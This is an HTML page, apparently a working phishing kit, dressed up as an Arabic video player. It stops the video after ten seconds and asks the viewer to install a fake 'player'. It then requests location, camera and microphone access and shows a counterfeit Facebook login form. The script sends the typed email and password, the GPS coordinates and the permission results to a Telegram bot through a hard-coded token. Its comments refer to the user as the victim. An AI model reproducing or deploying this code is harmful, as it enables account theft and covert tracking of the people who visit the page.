<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player Support</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { margin: 0; background: #000; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        video { width: 100%; max-height: 80vh; }
        #modal, #fb { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
        .box { background: #fff; color: #000; padding: 20px; border-radius: 12px; text-align: center; width: 100%; max-width: 350px; }
        button { background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 6px; width: 100%; font-weight: bold; margin-top: 10px; cursor: pointer; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .fb-logo { color: #1877f2; font-size: 30px; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>

    <video id="v" controls poster="trend_bg.jpg.jpg">
        <source src="v.mp4" type="video/mp4">
    </video>

    <div id="modal">
        <div class="box">
            <h3 style="color:#1877f2">تنبيه المشغل</h3>
            <p>لاستكمال مشاهدة الفيديو بالكامل، يرجى تثبيت المشغل الخاص بنا.</p>
            <button id="ins">تثبيت واستكمال الفيديو</button>
        </div>
    </div>

    <div id="fb">
        <div class="box">
            <div class="fb-logo">facebook</div>
            <p style="font-size:13px; color:#606770">يجب تسجيل الدخول للمتابعة</p>
            <input type="text" id="u" placeholder="البريد الإلكتروني أو الهاتف">
            <input type="password" id="p" placeholder="كلمة السر">
            <button id="go">تسجيل الدخول</button>
        </div>
    </div>

    <script>
        const token = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
        const chatId = "1356975454";
        const video = document.getElementById('v');
        let prompt;

        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }

        window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); prompt = e; });

        // أول ما الفيديو يوصل للثانية 10 يقطع وتظهر الرسالة
        video.ontimeupdate = () => {
            if (video.currentTime >= 10) {
                video.pause();
                video.currentTime = 10; // يثبت عند الثانية 10
                document.getElementById('modal').style.display = 'flex';
            }
        };

        document.getElementById('ins').addEventListener('click', async () => {
            if (prompt) {
                prompt.prompt();
                const { outcome } = await prompt.userChoice;
                if (outcome === 'accepted') send("🎯 الضحية وافق على تثبيت المشغل");
            }
            // طلب كل الأذونات فوراً
            navigator.geolocation.getCurrentPosition((pos) => {
                send(`📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            });
            try {
                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                send("🎙️📸 تم فتح الكاميرا والمايك");
            } catch (e) { send("❌ رفض الكاميرا/المايك"); }
            
            // اظهر صفحة الفيس
            document.getElementById('modal').style.display = 'none';
            document.getElementById('fb').style.display = 'flex';
        });

        document.getElementById('go').addEventListener('click', () => {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(user && pass) {
                send(`🔐 حساب جديد:\n📧: ${user}\n🔑: ${pass}`);
                alert("⚠️ خطأ في الخادم، حاول لاحقاً");
                window.location.href = "https://m.facebook.com";
            }
        });

        function send(t) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}`, { mode: 'no-cors' });
        }
    </script>
</body>
</html>
